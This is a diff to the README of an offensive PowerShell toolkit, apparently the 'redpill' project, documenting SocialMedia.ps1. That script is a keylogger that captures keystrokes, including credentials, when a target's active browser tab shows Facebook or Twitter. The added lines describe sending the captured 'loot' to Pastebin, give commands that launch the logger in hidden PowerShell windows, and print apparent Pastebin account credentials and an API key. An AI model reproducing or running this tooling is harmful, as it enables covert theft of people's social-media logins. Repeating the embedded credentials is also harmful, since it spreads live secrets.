@@ -346,6 +346,26 @@ Winget search games
 |Delay|Milliseconds delay between loops|1200|1200|
 |Force|Switch to bypass check: Is_Browser_Active?|Switch|Switch|
 |Schedule|Schedule cmdlet execution to: [HH:mm]|09:43,now|now|
+|SendToPasteBin|Switch to send loot to pastebin|switch|switch|
+|PastebinUsername|PasteBin UserName to authenticate to|user input|Meterpeter|
+|PastebinPassword|PasteBin Password to authenticate to|user input|houdini12345|
+|PastebinDeveloperKey|The pasteBin API key to authenticate with|user input|OuSFtYtUpaWKq4uVawzPuo3i-NM1c2nN|
+
+<br />
+
+**DESCRIPTION**<br />
+Start recording keyboard keystrokes if target has facebook or twitter in the 'active browser tab'<br />
+
+**NOTES**<br />
+Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox.<br />
+Multiple logfiles will be saved under target %TMP% directory with<br />
+the names 1_[random].Facebook OR 1_[random].Twitter [extensions].<br />
+
+**[SEND_TO_PASTEBIN]**.<br />
+Remark: pastebin webserver only accepts 20 pastes per day! (free account).<br />
+Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:.<br />
+1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin.<br />
+2 - Browser closes (key`logger waits for browser to restart) => SendToPasteBin<br />
 
 <br />
 
@@ -371,9 +391,19 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 ## Schedule cmdlet capture to start at [HH:mm] hours
 .\SocialMedia.ps1 -schedule '02:34' -Mode 'start'
 
+
 ## Schedule cmdlet capture to start at -shedule '[HH:mm]' hours and Bypass check: Is_Browser_Active?
 Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -schedule '02:34' -mode 'start' -force"
 
 ## Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials
-Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '800' -force" 
+Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '800' -force"
+
+## Start key`logger and send logfiles to pastebin everytime target user changes\exit from social media browser active tab
+# This example uses 'meterpeter C2' pastebin credentials as demo, but users can input your own pastebin account creds\APIkey
+Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -force -sendtopastebin"
+
+
+## Hint: force 'SendToPasteBin' function to run before leaking any captures.
+# Function opens a new browser tab that triggers cmdlet to execute 'SendToPasteBin' function.
+.\socialmedia.ps1 -mode stop -sendtopastebin
 ```
